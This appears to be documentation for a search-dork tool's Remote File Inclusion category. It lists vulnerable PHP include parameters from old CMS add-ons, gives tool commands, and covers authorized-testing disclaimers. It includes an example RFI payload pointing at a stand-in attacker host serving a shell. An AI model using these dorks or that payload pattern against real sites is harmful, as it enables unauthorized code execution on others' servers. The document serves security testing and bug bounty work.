# RFI Dorks — Remote File Inclusion (`database/rfi/`)

RFI is the sibling of LFI: instead of pulling in a *local* file on the
server, the vulnerable parameter fetches and executes a file from a URL
the attacker controls (`?include=http://evil.example/shell.txt`). It's
historically one of the most severe web bugs because a successful RFI
often means immediate remote code execution.

```
database/rfi/
└── rfi1.txt   # Path/include parameters in older PHP CMS, forum, and gallery packages
```

This category overlaps heavily with [LFI Dorks](lfi-dorks.md) — the same
parameter names show up in both because the underlying flaw is identical
(unvalidated `include()`/`require()`); the only difference is whether the
target application allows a remote URL (`allow_url_include`) or is
restricted to local paths.

## What this category looks for

| Aspect | Description |
|--------|--------------|
| **Purpose** | Finds parameters passed straight into a PHP `include`/`require` (or equivalent) without validating that the value is a safe local path — the classic old-CMS/forum/gallery/calendar add-on pattern. |
| **Common parameter names** | `?include=`, `?inc=`, `?inc_dir=`, `?root_dir=`, `?basepath=`, `?path=`, `?libpath=`, `?config[path]=`, `?theme_path=`, `?GALLERY_BASEDIR=`. |
| **Typical vulnerable software** | The same generation of PHP add-ons as the LFI set — Joomla/Mambo components (`com_*`), phpBB/YaBB forum add-ons, gallery/calendar plugins (Coppermine, agendax, dotProject), and small standalone scripts from the mid-2000s PHP ecosystem. |
| **Confirming RFI vs. LFI** | RFI requires the target's PHP config to allow remote includes (`allow_url_fopen`/`allow_url_include` — disabled by default in modern PHP). Most matches today will only be exploitable as LFI, if at all; treat an RFI hit as a lead to verify, not a confirmed finding. |

## Sample entries

```text
index.php?include=
index.php?inc=
index.php?inc_dir=
modules/mod_mainmenu.php?mosConfig_absolute_path=
pivot/modules/module_db.php?pivot_path=
zentrack/index.php?configFile=
components/com_pollxt/conf.pollxt.php?mosConfig_absolute_path=
includes/dbal.php?eqdkp_root_path=
library/editor/editor.php?root=
calendar/embed/day.php?path=
armygame.php?libpath=
os/pointer.php?url=
```

**Usage:**

```bash
# Load and run the RFI category
atdork --database-dork rfi/rfi1 -r 25

# Combine with the LFI category since they target the same flaw class
atdork --database-dork rfi/rfi1,lfi/lfi1 --database-r 30 --filter-vuln lfi

# Preview before running
atdork --database-dork rfi/rfi1 --database-preview
```

## Confirming a real finding

A dork match is only a parameter name — it tells you nothing about whether
the include is actually unsafe. Before treating anything as a finding:

1. Test with a harmless, clearly-inert value first (not a live shell) to see whether the parameter reaches an `include()`/`require()` at all.
2. Look for the classic error strings when a value fails to load:
   ```text
   "failed to open stream: No such file"
   "include_once(): Failed opening"
   "require_once(): Failed opening"
   ```
3. Only escalate to demonstrating remote inclusion within the rules your authorization/program scope actually allows — for most bounty programs, a benign proof (e.g. pointing at a harmless file you control and showing its content rendered) is sufficient; you don't need to drop a working shell to prove impact.

---

## ⚠️ Disclaimer & Legal Notice

This category is intended **only** for:

1. Security testing on websites/servers you own.
2. Official Bug Bounty programs with explicit written authorization from the target owner.
3. Academic/educational security research in a controlled environment (university labs, legal CTF platforms like HackTheBox, TryHackMe).

**Strictly prohibited:** breaking into systems without authorization, uploading/executing malicious payloads on systems you don't have permission to test, planting backdoors, or defacing websites. An RFI finding that escalates to code execution is a serious impact — report it through the program's process rather than using it to pivot further than your authorization covers.

### Legal basis in Indonesia (UU ITE No. 19 of 2016)

| Article | Offense | Penalty |
|---------|---------|---------|
| Article 30 | Unauthorized access to another party's system | 6–12 years imprisonment |
| Article 32 | Altering/deleting/transferring another party's data | Up to 8 years imprisonment, fine up to Rp 2 billion |
| Article 35 | Distributing exploit results/misleading information | Up to 12 years imprisonment, fine up to Rp 12 billion |

The developers and this documentation are not responsible for misuse. Any legal consequences are entirely the user's responsibility.

## ✅ Correct, Ethical Usage

1. Confirm **written authorization** before targeting any domain you don't own.
2. Scope every dork with `site:target.com` before running at scale.
3. Prove the vulnerability with the least invasive payload that demonstrates impact — don't deploy a real webshell on someone else's box.
4. Add delay between requests (`--delay`) so you aren't mistaken for abuse.
5. Report findings professionally through an official bug bounty program.

---

*See also: [LFI Dorks](lfi-dorks.md) for the closely-related local-inclusion category, [Common Dorks](common-dorks.md), [Bing & DuckDuckGo Dorks](bing-and-ddg-dorks.md), and the [Database Dorks overview](index.md) for the full `database/` folder structure.*
